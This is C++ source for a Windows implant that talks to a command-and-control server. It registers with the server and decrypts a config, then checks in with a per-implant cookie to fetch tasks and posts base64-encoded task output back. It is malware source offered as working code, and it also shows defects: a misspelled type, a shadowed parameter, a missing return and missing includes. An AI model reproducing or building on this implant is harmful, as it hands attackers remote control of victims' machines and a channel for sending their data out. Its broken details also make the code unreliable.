#include <windows.h>
#include "rapidjson/document.h"
#include "httpclient.h"
#include "implant.h"
#include "crypto.h"
#include "profile.h"
#include "task.h"
#include "debug.h"
#include "utils.h"
#include "constants.h"
#include <string>
#include <iostream>

using namespace std;

MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string privKey)
{
    rapidjson::Document registerDocument;
    registerDocument.SetObject();
    rapidjson::Document::AllocatorType &allocator = registerDocument.GetAllocator();
    rapidjson::Value pubKeyVal(pubKey.c_str(), allocator);
    registerDocument.AddMember("txid", pubKeyVal, allocator);

    rapidjson::StringBuffer buffer;
    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
    registerDocument.Accept(writer);
    const char *key_json = buffer.GetString();

    PSIZE_T outSize = 0;

    // Register
    string res = HTTPRequest(L"POST", serverUrl, L"/c2/register", 8080, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
    // string res_str = LPBYTEToString(res, GetLPBYTELength(res));
    DEBUG_PRINTF("Register response: %s\n", res.c_str());
    // cout << res_str << endl;
    rapidjson::Document resDocument;
    resDocument.Parse(res.c_str());

    DEBUG_PRINTF("status: %d\n", resDocument["status"].GetBool());
    DEBUG_PRINTF("Config: %s\n", resDocument["c"].GetString());

    const rapidjson::Value &c = resDocument["c"];
    string c_str = c.GetString();
    string cDecoded = base64DecodeToString(c_str);
    string b64ServerPubKey = resDocument["k"].GetString();

    // We still need to decrypt the config
    string decryptedConfig = decryptB64String(b64ServerPubKey, privKey, c_str);

    cout << decryptedConfig << endl;

    return parseMalleableConfig(decryptedConfig, privKey);
}

Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
{
    PSIZE_T outSize = 0;
    //string authCookie = "Cookie: " + profile->cookie + "=" + profile->implantId;
    // char* authCookieString;
    // sprintf(authCookieString, "Cookie: %s=%s", profile->cookie.c_str(), profile->implantId.c_str());
    // cout << authCookieString << endl;
    std::ostringstream oss;
    oss << "Cookie: " << profile->cookie << "=" << profile->implantId;
    string authCookieString = oss.str();
    std::wstring authCookie(authCookieString.begin(), authCookieString.end());
    DEBUG_PRINTF("Auth cookie: %ls\n", authCookie.c_str());
    string res = HTTPRequest(L"GET", serverUrl, L"/c2/checkin", 8080, L"Hello-world", authCookie.c_str(), NULL, 0, outSize, FALSE);
    DEBUG_PRINTF("Checkin done\n");
    // decode and decrypt the response
    string resDecoded = res; /*decryptB64String(profile->base64ServerPublicKey,
                                         profile->base64EncryptionKey,
                                         res);*/

    DEBUG_PRINTF("Checkin response: %s\n", resDecoded.c_str());
    
    return parseTask(resDecoded);
}

bool SendTaskResult(LPCSTR taskId, LPBYTE results, BOOL success, MallableProfile *profile)
{
    /* Payload format:
    {
        "status": bool,
        "tid": taskId,
        "output": "base64 encoded results"
    }
    
    */

    // JSON encode the results
    vector<BYTE> results = LPBYTEToVector(results, GetLPBYTELength(results));
    string resultsB64 = base64Encode(results);
    rapidjson::Document resultsDocument;
    resultsDocument.SetObject();
    rapidjson::Document::AllocatorType &allocator = resultsDocument.GetAllocator();
    rapidjson::Value resultsVal(resultsB64.c_str(), allocator);
    resultsDocument.AddMember("output", resultsVal, allocator);
    rapidjson::Value tidVal(taskId, allocator);
    resultsDocument.AddMember("tid", tidVal, allocator);
    rapidjson::Value statusVal(success, allocator);
    resultsDocument.AddMember("status", statusVal, allocator);

    rapidjson::StringBuffer buffer;
    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
    resultsDocument.Accept(writer);
    const char *results_json = buffer.GetString();

    DEBUG_PRINTF("Results JSON: %s\n", results_json);

    // Build auth cookie
    std::ostringstream oss;
    oss << "Cookie: " << profile->cookie << "=" << profile->implantId;
    string authCookieString = oss.str();
    std::wstring authCookie(authCookieString.begin(), authCookieString.end());

    // Send the results
    PSIZE_T outSize = 0;
    string res = HTTPRequest(L"POST", profile->serverUrl, TASK_RESULTS_ENDPOINT, 8080, L"Hello-world", authCookie.c_str(), (LPBYTE)results_json, strlen(results_json), outSize, FALSE);
    
}